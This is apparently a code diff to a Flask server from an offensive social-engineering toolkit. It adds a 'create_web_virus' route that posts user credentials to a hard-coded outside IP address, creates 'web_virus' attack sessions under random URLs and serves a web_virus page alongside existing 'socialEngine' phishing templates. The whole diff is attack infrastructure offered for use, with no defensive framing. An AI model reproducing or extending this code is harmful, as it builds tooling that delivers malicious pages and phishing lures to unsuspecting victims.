@@ -46,6 +46,33 @@ def get_random() -> str:
     else:
         return random_string
 
+@app.route('/create_web_virus/<user>/<pwd>' , methods=['GET'])
+def create_web_virus(user , pwd):
+    # 限制每个IP对制定api的访问.
+    client_ip = request.remote_addr
+    if client_ip in visit_request:
+        visit_request[client_ip] = visit_request[client_ip] + 1
+        if visit_request[client_ip] >= 6:
+            return 'Too many requests'
+    else:
+        visit_request[client_ip] = 1
+
+    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
+    if r.text != 'Passwd Or UserName Error!':
+        n = get_random()
+        
+        u = user_sessen()
+        u.url = n
+        u.attack_type = 'web_virus'
+        u.username = user
+        u.url_clone = attack_url
+
+        url_list[n] = u
+        return n
+
+    else:
+        return 'your message error' 
+
 @app.route('/qr_code' , methods=['POST'])
 def make_qr_code():
     # 限制每个IP对制定api的访问.
@@ -140,10 +167,12 @@ def attack_url(attack_url):
         u: user_sessen = url_list.get(attack_url)
         r = Response()
         try:
-                
-            # print('modules/socialEngine/'+u.attack_type+"/index.html")
-            # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
-            r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
+            if u.attack_type == 'web_virus':
+                r.data = open('modules/web_virus/index.html').read()
+            else:
+                # print('modules/socialEngine/'+u.attack_type+"/index.html")
+                # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
+                r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
             return r
         except:
             return 'the server error'
